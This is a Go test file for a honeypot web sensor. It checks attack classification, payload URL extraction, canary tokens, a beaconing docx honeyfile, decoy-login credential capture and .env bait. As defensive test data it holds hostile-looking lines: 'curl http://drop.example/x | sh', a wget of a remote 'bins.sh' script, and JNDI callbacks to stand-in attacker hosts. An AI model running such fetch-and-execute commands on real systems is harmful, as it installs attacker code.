package web_test

import (
	"archive/zip"
	"bytes"
	"context"
	"io"
	"log/slog"
	"net/http"
	"net/url"
	"strings"
	"sync"
	"testing"
	"time"

	pb "github.com/honeynet/node/gen/honeynet/v1"
	"github.com/honeynet/node/internal/personality"
	"github.com/honeynet/node/internal/protocols/web"
)

// ---- payload analysis ----

func TestAnalyzeDetectsLog4Shell(t *testing.T) {
	// Log4Shell arrives in headers, essentially never in the path. A scanner
	// that only checked the URL would miss the entire campaign.
	cases := []struct {
		name    string
		headers map[string]string
	}{
		{"user-agent", map[string]string{"User-Agent": jndiLDAP("198.51.100.7:1389")}},
		{"referer", map[string]string{"Referer": jndiRMI("evil.test")}},
		{"x-api-version", map[string]string{"X-Api-Version": jndiDNS("c.evil.test")}},
		{"obfuscated", map[string]string{"User-Agent": jndiObfuscated("evil.test")}},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			got := web.Analyze("/", "", tc.headers, "")
			if !contains(got, web.AttackLog4Shell) {
				t.Errorf("Analyze() = %v, want it to contain %q", got, web.AttackLog4Shell)
			}
		})
	}
}

func TestAnalyzeDetectsCommonExploitClasses(t *testing.T) {
	cases := []struct {
		name    string
		path    string
		query   string
		headers map[string]string
		body    string
		want    string
	}{
		{"sqli-union", "/item.php", sqlUnion(), nil, "", web.AttackSQLi},
		{"sqli-sleep", "/x", sqlSleep(), nil, "", web.AttackSQLi},
		{"traversal", "/download", traversal(), nil, "", web.AttackPathTraversal},
		{"traversal-encoded", "/d", traversalEncoded(), nil, "", web.AttackPathTraversal},
		{"command-injection", "/ping", commandInjection(), nil, "", web.AttackCommandInj},
		{"webshell", "/upload.php", "", nil, webShellPHP(), web.AttackWebShell},
		{"shellshock", "/cgi-bin/test", "", map[string]string{"User-Agent": shellshock()}, "", web.AttackShellshock},
		{"ssrf-metadata", "/fetch", ssrfMetadata(), nil, "", web.AttackSSRF},
		{"xxe", "/api", "", nil, xxeDoctype(), web.AttackXXE},
		{"secret-probe", "/.env", "", nil, "", web.AttackSecretProbe},
		{"secret-probe-git", "/.git/config", "", nil, "", web.AttackSecretProbe},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			got := web.Analyze(tc.path, tc.query, tc.headers, tc.body)
			if !contains(got, tc.want) {
				t.Errorf("Analyze() = %v, want it to contain %q", got, tc.want)
			}
		})
	}
}

func TestAnalyzeIsQuietOnOrdinaryTraffic(t *testing.T) {
	// A classifier that fires on everything tells an analyst nothing.
	cases := []struct {
		path, query string
		headers     map[string]string
	}{
		{"/", "", map[string]string{"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) Chrome/120.0"}},
		{"/index.html", "", map[string]string{"User-Agent": "curl/7.81.0"}},
		{"/api/v1/users", "page=2&limit=50", nil},
		{"/favicon.ico", "", nil},
		{"/robots.txt", "", map[string]string{"User-Agent": "Googlebot/2.1"}},
	}
	for _, tc := range cases {
		if got := web.Analyze(tc.path, tc.query, tc.headers, ""); len(got) > 0 {
			t.Errorf("Analyze(%q, %q) = %v, want no detections", tc.path, tc.query, got)
		}
	}
}

func TestExtractJNDITargetsRecoversCallbackHost(t *testing.T) {
	// The JNDI callback host is the attacker's own infrastructure, which makes
	// it a stronger indicator than the source address -- that is usually a
	// compromised third party.
	headers := map[string]string{"User-Agent": jndiLDAP("198.51.100.7:1389")}
	got := web.ExtractJNDITargets("/", "", headers, "")
	if len(got) != 1 || got[0] != "198.51.100.7:1389" {
		t.Errorf("ExtractJNDITargets() = %v, want [198.51.100.7:1389]", got)
	}
}

func TestExtractURLsFindsPayloadsInAnyPart(t *testing.T) {
	got := web.ExtractURLs(
		"/shell.php",
		"cmd=wget%20http://185.100.87.202/bins.sh",
		map[string]string{"X-Forwarded-For": "see http://evil.test/a"},
		"curl http://drop.example/x | sh",
	)
	for _, want := range []string{
		"http://185.100.87.202/bins.sh",
		"http://evil.test/a",
		"http://drop.example/x",
	} {
		if !contains(got, want) {
			t.Errorf("ExtractURLs() = %v, want it to contain %q", got, want)
		}
	}
}

// ---- canary tokens ----

func TestCanaryTokenRoundTrip(t *testing.T) {
	tok := web.Token("node-a", "dotenv")
	if len(tok) != 16 {
		t.Fatalf("token = %q, want 16 hex chars", tok)
	}

	u, err := url.Parse(web.CanaryURL("sensor.example", tok))
	if err != nil {
		t.Fatalf("canary URL is not parseable: %v", err)
	}
	got, ok := web.ParseCanaryToken(u.Path)
	if !ok || got != tok {
		t.Errorf("ParseCanaryToken(%q) = %q, %v; want %q, true", u.Path, got, ok, tok)
	}
}

func TestCanaryTokenIsDeterministicPerNode(t *testing.T) {
	// A sensor that restarts must still recognise tokens it planted before,
	// without keeping a database of issued tokens.
	if web.Token("node-a", "dotenv") != web.Token("node-a", "dotenv") {
		t.Error("token derivation is not deterministic")
	}
	if web.Token("node-a", "dotenv") == web.Token("node-b", "dotenv") {
		t.Error("two nodes derived the same token; canary hits would be unattributable")
	}
	if web.Token("node-a", "dotenv") == web.Token("node-a", "actuator") {
		t.Error("two purposes derived the same token; a hit would not name the file")
	}
}

func TestParseCanaryTokenRejectsNonTokens(t *testing.T) {
	for _, p := range []string{
		"/", "/static/img/logo.png", "/static/img/.png",
		"/static/img/zzzzzzzzzzzzzzzz.png", // right length, not hex
		"/static/img/abc.png",              // too short
		"/other/abcdef0123456789.png",      // wrong prefix
	} {
		if tok, ok := web.ParseCanaryToken(p); ok {
			t.Errorf("ParseCanaryToken(%q) = %q, true; want false", p, tok)
		}
	}
}

func TestHoneyfileDocxIsAValidOpenXMLPackage(t *testing.T) {
	// A corrupt document gets deleted rather than opened, so the file has to be
	// genuinely valid or the canary never fires.
	files, err := web.GenerateHoneyfiles("node-a", "sensor.example")
	if err != nil {
		t.Fatalf("GenerateHoneyfiles: %v", err)
	}

	var docx web.Honeyfile
	for _, f := range files {
		if f.Type == "docx-callback" {
			docx = f
		}
	}
	if docx.Content == nil {
		t.Fatal("no docx honeyfile generated")
	}

	zr, err := zip.NewReader(bytes.NewReader(docx.Content), int64(len(docx.Content)))
	if err != nil {
		t.Fatalf("docx is not a valid zip: %v", err)
	}

	parts := map[string]string{}
	for _, f := range zr.File {
		rc, err := f.Open()
		if err != nil {
			t.Fatalf("open %s: %v", f.Name, err)
		}
		b, _ := io.ReadAll(rc)
		_ = rc.Close()
		parts[f.Name] = string(b)
	}

	for _, required := range []string{
		"[Content_Types].xml", "_rels/.rels",
		"word/document.xml", "word/_rels/document.xml.rels",
	} {
		if _, ok := parts[required]; !ok {
			t.Errorf("docx missing required part %q", required)
		}
	}

	rels := parts["word/_rels/document.xml.rels"]
	// TargetMode="External" is the entire mechanism: without it Word looks for
	// the image inside the package and never makes a network request.
	if !strings.Contains(rels, `TargetMode="External"`) {
		t.Error("image relationship is not external; the canary would never fire")
	}
	if !strings.Contains(rels, web.Token("node-a", "honeyfile-docx")) {
		t.Error("relationship does not embed the callback token")
	}
	if !strings.Contains(parts["word/document.xml"], "rIdImg1") {
		t.Error("document body does not reference the image relationship")
	}
}

// ---- server behaviour ----

type memSink struct {
	mu   sync.Mutex
	envs []*pb.Envelope
}

func (m *memSink) Append(e *pb.Envelope) error {
	m.mu.Lock()
	defer m.mu.Unlock()
	m.envs = append(m.envs, e)
	return nil
}

func (m *memSink) snapshot() []*pb.Envelope {
	m.mu.Lock()
	defer m.mu.Unlock()
	return append([]*pb.Envelope(nil), m.envs...)
}

func startWeb(t *testing.T, seed string) (string, *memSink) {
	t.Helper()

	sink := &memSink{}
	// Canary tokens key on the node's credential secret rather than its
	// personality seed, so that a public node ID cannot be used to precompute
	// the fleet's tokens. The tests pass the seed as the secret so the token
	// values they assert on stay stable.
	p := personality.Derive(seed)
	p.TokenSecret = seed

	srv := web.New(web.Config{
		NodeID:           "test-node",
		Addr:             "127.0.0.1:0",
		CredentialSecret: seed,
		SessionIdle:      time.Minute,
		MaxSessions:      32,
		MaxSessionsPerIP: 16,
		CallbackHost:     "sensor.example",
	}, p, sink,
		slog.New(slog.NewTextHandler(io.Discard, &slog.HandlerOptions{Level: slog.LevelError})),
		func() {})

	ln, err := srv.Listen()
	if err != nil {
		t.Fatalf("listen: %v", err)
	}
	ctx, cancel := context.WithCancel(context.Background())
	go func() { _ = srv.Serve(ctx, ln) }()
	t.Cleanup(func() { cancel(); _ = ln.Close() })

	return "http://" + srv.Addr(), sink
}

func TestWebServerRecordsAttackAndPayload(t *testing.T) {
	base, sink := startWeb(t, "web-node")

	req, _ := http.NewRequest("GET", base+"/", nil)
	req.Header.Set("User-Agent", jndiLDAP("198.51.100.7:1389"))
	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		t.Fatalf("request: %v", err)
	}
	_ = resp.Body.Close()

	envs := sink.snapshot()

	var httpReq *pb.HttpRequest
	for _, e := range envs {
		if h := e.GetHttpRequest(); h != nil {
			httpReq = h
		}
	}
	if httpReq == nil {
		t.Fatal("no HttpRequest event recorded")
	}
	if !contains(httpReq.DetectedAttacks, "log4shell") {
		t.Errorf("detected_attacks = %v, want log4shell", httpReq.DetectedAttacks)
	}

	var found bool
	for _, e := range envs {
		if a := e.GetArtifactReference(); a != nil && strings.Contains(a.Url, "198.51.100.7") {
			found = true
			if a.ViaTool != "log4shell-jndi" {
				t.Errorf("artifact via_tool = %q, want log4shell-jndi", a.ViaTool)
			}
		}
	}
	if !found {
		t.Error("JNDI callback host was not recorded as an artifact")
	}
}

func TestWebServerCapturesDecoyLoginCredentials(t *testing.T) {
	base, sink := startWeb(t, "web-node")

	form := url.Values{"pma_username": {"root"}, "pma_password": {"toor123"}}
	resp, err := http.Post(base+"/phpmyadmin/index.php",
		"application/x-www-form-urlencoded", strings.NewReader(form.Encode()))
	if err != nil {
		t.Fatalf("post: %v", err)
	}
	_ = resp.Body.Close()

	var auth *pb.AuthAttempt
	var httpReq *pb.HttpRequest
	for _, e := range sink.snapshot() {
		if a := e.GetAuthAttempt(); a != nil {
			auth = a
		}
		if h := e.GetHttpRequest(); h != nil {
			httpReq = h
		}
	}

	if auth == nil {
		t.Fatal("decoy login credentials were not recorded as an auth attempt")
	}
	if auth.Username != "root" || auth.Password != "toor123" {
		t.Errorf("captured %q:%q, want root:toor123", auth.Username, auth.Password)
	}
	if httpReq == nil || httpReq.DecoyProfile != "phpmyadmin" {
		t.Errorf("decoy profile = %q, want phpmyadmin", httpReq.GetDecoyProfile())
	}
}

func TestWebServerGroupsRequestsFromOneSourceIntoOneSession(t *testing.T) {
	// A scanner sweeping forty paths is one interaction. Recording it as forty
	// sessions would destroy the sequence information that makes it legible.
	base, sink := startWeb(t, "web-node")

	for _, p := range []string{"/", "/.env", "/wp-login.php", "/actuator/env", "/solr/admin"} {
		resp, err := http.Get(base + p)
		if err != nil {
			t.Fatalf("get %s: %v", p, err)
		}
		_ = resp.Body.Close()
	}

	sessions := map[string]int{}
	requests := 0
	for _, e := range sink.snapshot() {
		if e.GetHttpRequest() != nil {
			requests++
			sessions[e.SessionId]++
		}
	}
	if requests != 5 {
		t.Errorf("recorded %d requests, want 5", requests)
	}
	if len(sessions) != 1 {
		t.Errorf("requests spread across %d sessions, want 1", len(sessions))
	}
}

func TestCanaryCallbackFiresAndServesAPixel(t *testing.T) {
	base, sink := startWeb(t, "web-node")

	tok := web.Token("web-node", "dotenv")
	resp, err := http.Get(base + "/static/img/" + tok + ".png")
	if err != nil {
		t.Fatalf("canary request: %v", err)
	}
	body, _ := io.ReadAll(resp.Body)
	_ = resp.Body.Close()

	// Whoever opened the document must see a normal image; an error would tell
	// them the file was bait.
	if resp.StatusCode != http.StatusOK {
		t.Errorf("canary status = %d, want 200", resp.StatusCode)
	}
	if ct := resp.Header.Get("Content-Type"); ct != "image/png" {
		t.Errorf("canary content-type = %q, want image/png", ct)
	}
	if !bytes.HasPrefix(body, []byte("\x89PNG")) {
		t.Error("canary response is not a PNG")
	}

	var trig *pb.CanaryTrigger
	for _, e := range sink.snapshot() {
		if c := e.GetCanaryTrigger(); c != nil {
			trig = c
		}
	}
	if trig == nil {
		t.Fatal("canary callback did not emit a CanaryTrigger event")
	}
	if trig.TokenId != tok {
		t.Errorf("token = %q, want %q", trig.TokenId, tok)
	}
	if !strings.Contains(trig.PlantedPath, ".env") {
		t.Errorf("planted_path = %q, want it to name the .env decoy", trig.PlantedPath)
	}
}

func TestDotenvDecoyServesCanaryBait(t *testing.T) {
	base, _ := startWeb(t, "web-node")

	resp, err := http.Get(base + "/.env")
	if err != nil {
		t.Fatalf("get: %v", err)
	}
	body, _ := io.ReadAll(resp.Body)
	_ = resp.Body.Close()

	env := string(body)
	if !strings.Contains(env, "AWS_ACCESS_KEY_ID=AKIA") {
		t.Error(".env decoy is missing AWS credential bait")
	}
	if !strings.Contains(env, web.Token("web-node", "dotenv")) {
		t.Error(".env decoy does not embed its canary token")
	}
}

func contains(haystack []string, needle string) bool {
	for _, s := range haystack {
		if s == needle {
			return true
		}
	}
	return false
}
